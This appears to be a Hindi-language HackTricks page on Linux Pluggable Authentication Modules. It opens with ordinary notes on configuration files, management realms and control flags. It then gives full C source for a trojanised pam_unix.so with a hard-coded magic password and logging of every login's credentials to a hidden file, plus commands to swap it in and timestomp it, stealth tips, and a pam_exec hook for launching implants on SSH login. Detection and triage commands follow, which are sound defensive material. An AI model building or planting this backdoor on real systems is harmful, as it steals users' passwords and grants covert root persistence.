# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### बुनियादी जानकारी

**PAM (Pluggable Authentication Modules)** एक सुरक्षा तंत्र के रूप में काम करता है जो **कंप्यूटर सेवाओं तक पहुंचने का प्रयास करने वाले उपयोगकर्ताओं की पहचान की पुष्टि करता है**, और विभिन्न मानदंडों के आधार पर उनकी पहुँच को नियंत्रित करता है। यह एक डिजिटल गेटकीपर की तरह है, यह सुनिश्चित करता है कि केवल अधिकृत उपयोगकर्ता ही विशिष्ट सेवाओं का उपयोग कर सकें और आवश्यकता होने पर सिस्टम ओवरलोड से बचने के लिए उनके उपयोग को सीमित किया जा सके।

#### कॉन्फ़िगरेशन फ़ाइलें

- **Solaris and UNIX-based systems** सामान्यतः एक केंद्रीय कॉन्फ़िगरेशन फ़ाइल का उपयोग करते हैं जो कि `/etc/pam.conf` में स्थित होती है।
- **Linux systems** डायरेक्टरी-आधारित दृष्टिकोण को वरीयता देते हैं, और सेवा-विशिष्ट कॉन्फ़िगरेशन को `/etc/pam.d` के अंदर संग्रहीत करते हैं। उदाहरण के लिए, login सेवा के लिए कॉन्फ़िगरेशन फ़ाइल `/etc/pam.d/login` में मिलती है।

An example of a PAM configuration for the login service might look like this:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Management Realms**

ये क्षेत्र, या प्रबंधन समूह, **auth**, **account**, **password**, और **session** शामिल करते हैं, जिनमें से प्रत्येक प्रमाणन और सत्र प्रबंधन प्रक्रिया के विभिन्न पहलुओं के लिए उत्तरदायी है:

- **Auth**: उपयोगकर्ता की पहचान को सत्यापित करता है, अक्सर पासवर्ड के लिए पूछकर।
- **Account**: खाते की सत्यापन संभालता है, समूह सदस्यता या समय-सीमा प्रतिबंध जैसी शर्तों की जाँच करता है।
- **Password**: पासवर्ड अपडेट्स का प्रबंधन करता है, जिसमें जटिलता जांच या शब्दकोश हमलों की रोकथाम शामिल है।
- **Session**: सेवा सत्र की शुरुआत या समाप्ति के दौरान कार्यों का प्रबंधन करता है, जैसे निर्देशिकाओं को माउंट करना या संसाधन सीमाएँ सेट करना।

#### **PAM Module Controls**

कंट्रोल यह निर्धारित करते हैं कि सफलता या विफलता पर मॉड्यूल किस तरह प्रतिक्रिया देगा, जो समग्र प्रमाणन प्रक्रिया को प्रभावित करता है। इनमें शामिल हैं:

- **Required**: एक required मॉड्यूल की विफलता अंततः विफलता का कारण बनती है, पर यह तभी लागू होता है जब बाद के सभी मॉड्यूल जांचे जाने के बाद।
- **Requisite**: विफलता पर प्रक्रिया का तुरंत समाप्त कर देना।
- **Sufficient**: सफलता होने पर उसी realm के बाकी चेक्स को बाईपास कर दिया जाता है, जब तक कि बाद का कोई मॉड्यूल विफल न हो।
- **Optional**: केवल तब विफलता का कारण बनता है जब यह स्टैक में एकमात्र मॉड्यूल हो।

#### Example Scenario

कई **auth** मॉड्यूल्स के सेटअप में, प्रक्रिया एक कड़े क्रम का पालन करती है। यदि `pam_securetty` मॉड्यूल लॉगिन टर्मिनल को अनधिकृत पाता है, तो root logins अवरुद्ध कर दिए जाते हैं, फिर भी उसके "required" स्थिति के कारण सभी मॉड्यूल प्रोसेस किए जाते हैं। `pam_env` environment variables सेट करता है, जो संभावित रूप से उपयोगकर्ता अनुभव में सहायक होता है। `pam_ldap` और `pam_unix` मॉड्यूल मिलकर उपयोगकर्ता को authenticate करते हैं, जहाँ `pam_unix` पहले से प्रदान किए गए पासवर्ड का उपयोग करने का प्रयास करता है, जिससे प्रमाणन विधियों में दक्षता और लचीलापन बढ़ता है।


## Backdooring PAM – Hooking `pam_unix.so`

हाई-वैल्यू Linux परिवेशों में एक क्लासिक persistence trick यह है कि **swap the legitimate PAM library with a trojanised drop-in**. क्योंकि हर SSH / console लॉगिन अंततः `pam_unix.so:pam_sm_authenticate()` को कॉल करता है, C की कुछ पंक्तियाँ क्रेडेंशियल्स कैप्चर करने या एक *magic* password bypass लागू करने के लिए काफी हैं।

### Compilation Cheatsheet
<details>
<summary>नमूना `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

कम्पाइल करें और stealth-replace:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec टिप्स
1. **Atomic overwrite** – एक टेम्पररी फ़ाइल में लिखें और फिर `mv` करके जगह पर रखें ताकि आधी-लिखी हुई लाइब्रेरीज़ न बनें जो SSH को लॉक कर दें।
2. लॉग फ़ाइल का स्थान जैसे `/usr/bin/.dbus.log` वैध डेस्कटॉप आर्टिफैक्ट के साथ घुल-मिल जाता है।
3. सिम्बल एक्सपोर्ट्स एक जैसे रखें (`pam_sm_setcred`, आदि) ताकि PAM का गलत व्यवहार न हो।

### डिटेक्शन
* `pam_unix.so` का MD5/SHA256 distro package के साथ तुलना करें।
* `rpm -V pam` या `debsums -s libpam-modules` का उपयोग करके मैन्युअल हैशिंग के बिना बदली गई लाइब्रेरीज़ खोजें।
* `/lib/security/` के अंतर्गत world-writable या असामान्य ownership की जाँच करें।
* `auditd` नियम: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* अप्रत्याशित modules के लिए PAM configs में grep करें: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### त्वरित प्राथमिक जाँच कमांड्स (पोस्ट-कम्प्रोमाइज़ या थ्रेट-हंटिंग)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### `pam_exec` का दुरुपयोग persistence के लिए
`pam_unix.so` को बदलने के बजाय, हल्का तरीका यह है कि `/etc/pam.d/sshd` में एक `pam_exec` लाइन जोड़ दी जाए, ताकि हर SSH login सामान्य stack को अपरिवर्तित रखते हुए एक implant लॉन्च करे:
```bash
# Prepend to /etc/pam.d/sshd
session optional pam_exec.so quiet /usr/local/bin/.ssh_hook.sh
```
`pam_exec` sshd PAM context के अंदर root के रूप में चलता है, इसलिए स्क्रिप्ट बिना core libraries में किसी filesystem परिवर्तन के reverse shells गिरा सकती है, env vars इकट्ठा कर सकती है, या implanted sockets को फिर से खोल सकती है।

## संदर्भ

- [https://hotpotato.tistory.com/434](https://hotpotato.tistory.com/434)
- [Palo Alto Unit42 – Infiltration of Global Telecom Networks](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)

{{#include ../../banners/hacktricks-training.md}}
